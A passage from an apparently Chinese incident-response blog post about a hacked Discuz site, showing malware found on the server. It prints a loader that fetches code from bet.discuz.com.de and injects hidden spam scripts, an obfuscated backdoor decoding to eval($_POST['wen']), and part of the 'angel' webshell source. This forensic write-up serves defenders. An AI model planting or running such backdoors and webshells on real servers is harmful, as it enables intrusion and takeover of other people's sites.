#ffcc66;\">sp_cont<\/span>);\n$<span style=\"color: #ffcc66;\">contents<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">file_get_contents(<\/span>$<span style=\"color: #ffcc66;\">data_url<\/span>, <span style=\"color: #6699cc;\">false<\/span>, $<span style=\"color: #ffcc66;\">sp_stre<\/span>);\n}<span style=\"color: #99cc99;\">else<\/span>{\n$<span style=\"color: #ffcc66;\">handle<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">fopen(<\/span>$<span style=\"color: #ffcc66;\">data_url<\/span>, <span style=\"color: #66cccc;\">\"rb\"<\/span>);<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n$<span style=\"color: #ffcc66;\">contents<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">stream_get_contents(<\/span>$<span style=\"color: #ffcc66;\">handle<\/span>);<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n@<span style=\"color: #cccccc; background-color: #2d2d2d;\">fclose(<\/span>$<span style=\"color: #ffcc66;\">handle<\/span>);\n}\n<span style=\"color: #99cc99;\">return<\/span> $<span style=\"color: #ffcc66;\">contents<\/span>;\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">show<\/span>($<span style=\"color: #ffcc66;\">fileDir<\/span>){\n$<span style=\"color: #ffcc66;\">filename<\/span>=$<span style=\"color: #ffcc66;\">fileDir<\/span><span style=\"color: #f2777a; font-weight: bold;\">.<\/span><span style=\"color: #cccccc; background-color: #2d2d2d;\">md5(<\/span>$<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'HTTP_HOST'<\/span>].$<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'REQUEST_URI'<\/span>]);\n<span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">is_file(<\/span>$<span style=\"color: #ffcc66;\">filename<\/span>)){\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fp<\/span>=@<span style=\"color: #cccccc; background-color: #2d2d2d;\">fopen(<\/span>$<span style=\"color: #ffcc66;\">filename<\/span>,<span style=\"color: #66cccc;\">'r'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">data<\/span>=@<span style=\"color: #cccccc; background-color: #2d2d2d;\">fread(<\/span>$<span style=\"color: #ffcc66;\">fp<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">filesize(<\/span>$<span style=\"color: #ffcc66;\">filename<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">fclose(<\/span>$<span style=\"color: #ffcc66;\">fp<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">empty(<\/span>$<span style=\"color: #ffcc66;\">data<\/span>)) {@<span style=\"color: #cccccc; background-color: #2d2d2d;\">unlink(<\/span>$<span style=\"color: #ffcc66;\">filename<\/span>);<span style=\"color: #99cc99;\">return<\/span>;}\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">dec0de(<\/span>$<span style=\"color: #ffcc66;\">fileDir<\/span>,$<span style=\"color: #ffcc66;\">data<\/span>);\n} <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">data<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">getdata(<\/span><span style=\"color: #66cccc;\">'http:\/\/bet.discuz.com.de\/w0shiOo7.php?HOST='<\/span>.$<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'HTTP_H<\/span><span style=\"color: #66cccc; text-decoration: underline;\">OST'<\/span><span style=\"text-decoration: underline;\">]);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fp<\/span>=@<span style=\"color: #cccccc; background-color: #2d2d2d;\">fopen(<\/span>$<span style=\"color: #ffcc66;\">filename<\/span>,<span style=\"color: #66cccc;\">'w'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">fwrite(<\/span>$<span style=\"color: #ffcc66;\">fp<\/span>,$<span style=\"color: #ffcc66;\">data<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">fclose(<\/span>$<span style=\"color: #ffcc66;\">fp<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">strlen(<\/span>$<span style=\"color: #ffcc66;\">data<\/span>) &gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">1000<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">dec0de(<\/span>$<span style=\"color: #ffcc66;\">fileDir<\/span>,$<span style=\"color: #ffcc66;\">data<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n}}\n<span style=\"color: #99cc99;\">if<\/span>(!<span style=\"color: #cccccc; background-color: #2d2d2d;\">in_array(<\/span>$<span style=\"color: #ffcc66;\">IP<\/span>,$<span style=\"color: #ffcc66;\">KIP<\/span>)){\n<span style=\"color: #99cc99;\">foreach<\/span>($<span style=\"color: #ffcc66;\">KBot<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">KBots<\/span>){<span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">stristr(<\/span>$<span style=\"color: #ffcc66;\">Bot<\/span>,$<span style=\"color: #ffcc66;\">KBots<\/span>)){\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">show(<\/span>$<span style=\"color: #ffcc66;\">fileDir<\/span>);\n}}<span style=\"color: #99cc99;\">foreach<\/span>($<span style=\"color: #ffcc66;\">Key<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">Keys<\/span>){\n<span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">stristr(<\/span>$<span style=\"color: #ffcc66;\">Ref<\/span>,$<span style=\"color: #ffcc66;\">Keys<\/span>)){\n<span style=\"color: #99cc99;\">echo<\/span> <span style=\"color: #66cccc;\">\"&lt;div style='display:none'&gt;&lt;script language='javascript' src='http:\/\/count3<\/span><span style=\"color: #66cccc; text-decoration: underline;\">1.51yes.com\/click.aspx?id=310940343&amp;logo=1' charset='gb2312'&gt;&lt;\/script&gt;&lt;\/div&gt;&lt;script type='text\/javascript' src='http:\/\/api.discuz.com.de\/Seo.js'&gt;&lt;\/script&gt;\"<\/span><span style=\"text-decoration: underline;\">;}}}<\/span>\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n\n<p>\n\u4e0a\u9762\u4ee3\u7801\u7684\u76ee\u7684\u5c31\u662f\u4e0b\u8f7d\u6076\u610f\u4ee3\u7801\u5e76\u6267\u884c\u3002  \n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">\u7ee7\u7eed\u6392\u67e5<\/h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n\u901a\u8fc7\u6bd4\u8f83svn\u4e2d\u7684\u4ee3\u7801\u4e0e\u73b0\u7f51\u7684\u4ee3\u7801\u8fd8\u53d1\u73b0\u4e86\u4e00\u4e2a\u65b0\u7684\u540e\u95e8\u7a0b\u5e8f\n<\/p>\n\n<ul class=\"org-ul\">\n<li><code>uc_client\/control\/class.php<\/code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #cc99cc;\">&lt;?php<\/span> $<span style=\"color: #ffcc66;\">mt<\/span>=<span style=\"color: #66cccc;\">\"mFsKCleRfU\"<\/span>; $<span style=\"color: #ffcc66;\">ojj<\/span>=<span style=\"color: #66cccc;\">\"IEBleldle\"<\/span>; $<span style=\"color: #ffcc66;\">hsa<\/span>=<span style=\"color: #66cccc;\">\"E9TVFsnd2VuJ10p\"<\/span>; $<span style=\"color: #ffcc66;\">fnx<\/span>=<span style=\"color: #66cccc;\">\"Ow==\"<\/span>; $<span style=\"color: #ffcc66; text-decoration: underline;\">zk<\/span><span style=\"text-decoration: underline;\"> = <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">str_replace(<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"d\"<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"\"<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"sdtdrd_redpdldadcde\"<\/span><span style=\"text-decoration: underline;\">); $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">ef<\/span><span style=\"text-decoration: underline;\"> = $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">zk<\/span><span style=\"text-decoration: underline;\">(<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"z\"<\/span><span style=\"text-decoration: underline;\">, <\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"\"<\/span><span style=\"text-decoration: underline;\">, <\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"zbazsze64_zdzeczodze\"<\/span><span style=\"text-decoration: underline;\">); $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">dva<\/span><span style=\"text-decoration: underline;\"> = $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">zk<\/span><span style=\"text-decoration: underline;\">(<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"p\"<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"\"<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"pcprpepaptpe_fpupnpcptpipopn\"<\/span><span style=\"text-decoration: underline;\">); $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">zvm<\/span><span style=\"text-decoration: underline;\"> = $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">dva<\/span><span style=\"text-decoration: underline;\">(<\/span><span style=\"color: #66cccc; text-decoration: underline;\">''<\/span><span style=\"text-decoration: underline;\">, $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">ef<\/span><span style=\"text-decoration: underline;\">($<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">zk<\/span><span style=\"text-decoration: underline;\">(<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"le\"<\/span><span style=\"text-decoration: underline;\">, <\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"\"<\/span><span style=\"text-decoration: underline;\">, $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">ojj<\/span><span style=\"color: #f2777a; font-weight: bold; text-decoration: underline;\">.<\/span><span style=\"text-decoration: underline;\">$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">mt<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">hsa<\/span><span style=\"color: #f2777a; font-weight: bold; text-decoration: underline;\">.<\/span><span style=\"text-decoration: underline;\">$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">fnx<\/span><span style=\"text-decoration: underline;\">))); $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">zvm<\/span><span style=\"text-decoration: underline;\">(); <\/span><span style=\"color: #cc99cc; text-decoration: underline;\">?&gt;<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u89e3\u7801\u540e\u7684\u7ed3\u679c\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\">@<span style=\"color: #cccccc; background-color: #2d2d2d;\">eval(<\/span>$<span style=\"color: #6699cc;\">_POST<\/span>[<span style=\"color: #66cccc;\">'wen'<\/span>]);\n<\/pre>\n<\/div>\n\n<p>\n\u4e0a\u9762\u7684\u811a\u672c\u53ef\u4ee5\u6ce8\u5165\u4efb\u610f\u7684\u4ee3\u7801\u3002\n<\/p>\n<\/li>\n\n<li><code>.\/uc_server\/data\/tmp\/angel.php<\/code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #cc99cc;\">&lt;?php<\/span>\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">error_reporting(7<\/span>);\n@<span style=\"color: #cccccc; background-color: #2d2d2d;\">set_magic_quotes_runtime(0<\/span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">ob_start(<\/span>);\n$<span style=\"color: #ffcc66;\">mtime<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">explode(<\/span><span style=\"color: #66cccc;\">' '<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">microtime(<\/span>));\n$<span style=\"color: #ffcc66;\">starttime<\/span> = $<span style=\"color: #ffcc66;\">mtime<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>] + $<span style=\"color: #ffcc66;\">mtime<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>];\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">define(<\/span><span style=\"color: #66cccc;\">'SA_ROOT'<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">str_replace(<\/span><span style=\"color: #66cccc;\">'\\\\'<\/span>, <span style=\"color: #66cccc;\">'\/'<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">dirname(<\/span><span style=\"color: #6699cc;\">__FILE__<\/span>)).<span style=\"color: #66cccc;\">'\/'<\/span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">define(<\/span><span style=\"color: #66cccc;\">'IS_WIN'<\/span>, <span style=\"color: #6699cc;\">DIRECTORY_SEPARATOR<\/span> == <span style=\"color: #66cccc;\">'\\\\'<\/span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">define(<\/span><span style=\"color: #66cccc;\">'IS_COM'<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">class_exists(<\/span><span style=\"color: #66cccc;\">'COM'<\/span>) ? <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span> : <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span> );\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">define(<\/span><span style=\"color: #66cccc;\">'IS_GPC'<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">get_magic_quotes_gpc(<\/span>));\n$<span style=\"color: #ffcc66;\">dis_func<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">get_cfg_var(<\/span><span style=\"color: #66cccc;\">'disable_functions'<\/span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">define(<\/span><span style=\"color: #66cccc;\">'IS_PHPINFO'<\/span>, (!<span style=\"color: #cccccc; background-color: #2d2d2d;\">eregi(<\/span><span style=\"color: #66cccc;\">\"phpinfo\"<\/span>,$<span style=\"color: #ffcc66;\">dis_func<\/span>)) ? <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span> : <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span> );\n@<span style=\"color: #cccccc; background-color: #2d2d2d;\">set_time_limit(0<\/span>);@<span style=\"color: #cccccc; background-color: #2d2d2d;\">preg_replace(<\/span><span style=\"color: #66cccc;\">\"\/[email]\/e\"<\/span>,$<span style=\"color: #6699cc;\">_POST<\/span>[<span style=\"color: #66cccc;\">'Id'<\/span>],<span style=\"color: #66cccc;\">\"error\"<\/span>);\n\n<span style=\"color: #99cc99;\">foreach<\/span>($<span style=\"color: #6699cc;\">_POST<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">key<\/span> =<span style=\"color: #6699cc;\">&gt;<\/span> $<span style=\"color: #ffcc66;\">value<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #f2777a; font-weight: bold;\">IS_GPC<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">value<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">s_array(<\/span>$<span style=\"color: #ffcc66;\">value<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">$key<\/span> = $<span style=\"color: #ffcc66;\">value<\/span>;\n}\n<span style=\"color: #999999; font-style: italic;\">\/*<\/span><span style=\"color: #999999; font-style: italic;\">===================== &#31243;&#24207;&#37197;&#32622; =====================*\/<\/span>\n\n<span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">echo encode_pass('angel');exit;<\/span>\n<span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">angel = ec38fe2a8497e0a8d6d349b3533038cb<\/span>\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#22914;&#26524;&#38656;&#35201;&#23494;&#30721;&#39564;&#35777;,&#35831;&#20462;&#25913;&#30331;&#38470;&#23494;&#30721;,&#30041;&#31354;&#20026;&#19981;&#38656;&#35201;&#39564;&#35777;<\/span>\n$<span style=\"color: #ffcc66;\">pass<\/span>  = <span style=\"color: #66cccc;\">'ec38fe2a8497e0a8d6d349b3533038cb'<\/span>; <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">angel<\/span>\n\n<span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">&#22914;&#24744;&#23545; cookie &#20316;&#29992;&#33539;&#22260;&#26377;&#29305;&#27530;&#35201;&#27714;, &#25110;&#30331;&#24405;&#19981;&#27491;&#24120;, &#35831;&#20462;&#25913;&#19979;&#38754;&#21464;&#37327;, &#21542;&#21017;&#35831;&#20445;&#25345;&#40664;&#35748;<\/span>\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">cookie &#21069;&#32512;<\/span>\n$<span style=\"color: #ffcc66;\">cookiepre<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">cookie &#20316;&#29992;&#22495;<\/span>\n$<span style=\"color: #ffcc66;\">cookiedomain<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">cookie &#20316;&#29992;&#36335;&#24452;<\/span>\n$<span style=\"color: #ffcc66;\">cookiepath<\/span> = <span style=\"color: #66cccc;\">'\/'<\/span>;\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">cookie &#26377;&#25928;&#26399;<\/span>\n$<span style=\"color: #ffcc66;\">cookielife<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">86400<\/span>;\n\n<span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">&#31243;&#24207;&#25628;&#32034;&#21487;&#20889;&#25991;&#20214;&#30340;&#31867;&#22411;<\/span>\n!$<span style=\"color: #ffcc66;\">writabledb<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">writabledb<\/span> = <span style=\"color: #66cccc;\">'php,cgi,pl,asp,inc,js,html,htm,jsp'<\/span>;\n<span style=\"color: #999999; font-style: italic;\">\/*<\/span><span style=\"color: #999999; font-style: italic;\">===================== &#37197;&#32622;&#32467;&#26463; =====================*\/<\/span>\n\n$<span style=\"color: #ffcc66;\">charsetdb<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">''<\/span>,<span style=\"color: #66cccc;\">'armscii8'<\/span>,<span style=\"color: #66cccc;\">'ascii'<\/span>,<span style=\"color: #66cccc;\">'big5'<\/span>,<span style=\"color: #66cccc;\">'binary'<\/span>,<span style=\"color: #66cccc;\">'cp1250'<\/span>,<span style=\"color: #66cccc;\">'cp1251'<\/span>,<span style=\"color: #66cccc;\">'cp12<\/span><span style=\"color: #66cccc; text-decoration: underline;\">56'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'cp1257'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'cp850'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'cp852'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'cp866'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'cp932'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'dec8'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'euc-jp'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'euc-kr'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'gb2312'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'gbk'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'geostd8'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'greek'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'hebrew'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'hp8'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'keybcs2'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'koi8r'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'koi8u'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'latin1'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'latin2'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'latin5'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'latin7'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'macce'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'macroman'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'sjis'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'swe7'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'tis620'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'ucs2'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'ujis'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'utf8'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">charset<\/span> == <span style=\"color: #66cccc;\">'utf8'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">header(<\/span><span style=\"color: #66cccc;\">\"content-Type: text\/html; charset=utf-8\"<\/span>);\n} <span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">charset<\/span> == <span style=\"color: #66cccc;\">'big5'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">header(<\/span><span style=\"color: #66cccc;\">\"content-Type: text\/html; charset=big5\"<\/span>);\n} <span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">charset<\/span> == <span style=\"color: #66cccc;\">'gbk'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">header(<\/span><span style=\"color: #66cccc;\">\"content-Type: text\/html; charset=gbk\"<\/span>);\n} <span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">charset<\/span> == <span style=\"color: #66cccc;\">'latin1'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">header(<\/span><span style=\"color: #66cccc;\">\"content-Type: text\/html; charset=iso-8859-2\"<\/span>);\n} <span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">charset<\/span> == <span style=\"color: #66cccc;\">'euc-kr'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">header(<\/span><span style=\"color: #66cccc;\">\"content-Type: text\/html; charset=euc-kr\"<\/span>);\n} <span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">charset<\/span> == <span style=\"color: #66cccc;\">'euc-jp'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">header(<\/span><span style=\"color: #66cccc;\">\"content-Type: text\/html; charset=euc-jp\"<\/span>);\n}\n\n$<span style=\"color: #ffcc66;\">self<\/span> = $<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'PHP_SELF'<\/span>] ? $<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'PHP_SELF'<\/span>] : $<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'SCRIPT_NAME'<\/span>];\n$<span style=\"color: #ffcc66;\">timestamp<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">time(<\/span>);\n\n<span style=\"color: #999999; font-style: italic;\">\/*<\/span><span style=\"color: #999999; font-style: italic;\">===================== &#36523;&#20221;&#39564;&#35777; =====================*\/<\/span>\n<span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">action<\/span> == <span style=\"color: #66cccc;\">\"logout\"<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">scookie(<\/span><span style=\"color: #66cccc;\">'loginpass'<\/span>, <span style=\"color: #66cccc;\">''<\/span>, -<span style=\"color: #cccccc; background-color: #2d2d2d;\">86400<\/span> * <span style=\"color: #cccccc; background-color: #2d2d2d;\">365<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">header(<\/span><span style=\"color: #66cccc;\">'Location: '<\/span>.$<span style=\"color: #ffcc66;\">self<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">exit<\/span>;\n}\n<span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">pass<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">action<\/span> == <span style=\"color: #66cccc;\">'login'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">pass<\/span> == <span style=\"color: #cccccc; background-color: #2d2d2d;\">encode_pass(<\/span>$<span style=\"color: #ffcc66;\">password<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">scookie(<\/span><span style=\"color: #66cccc;\">'loginpass'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">encode_pass(<\/span>$<span style=\"color: #ffcc66;\">password<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">header(<\/span><span style=\"color: #66cccc;\">'Location: '<\/span>.$<span style=\"color: #ffcc66;\">self<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">exit<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #6699cc;\">_COOKIE<\/span>[<span style=\"color: #66cccc;\">'loginpass'<\/span>]) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #6699cc;\">_COOKIE<\/span>[<span style=\"color: #66cccc;\">'loginpass'<\/span>] != $<span style=\"color: #ffcc66;\">pass<\/span>) 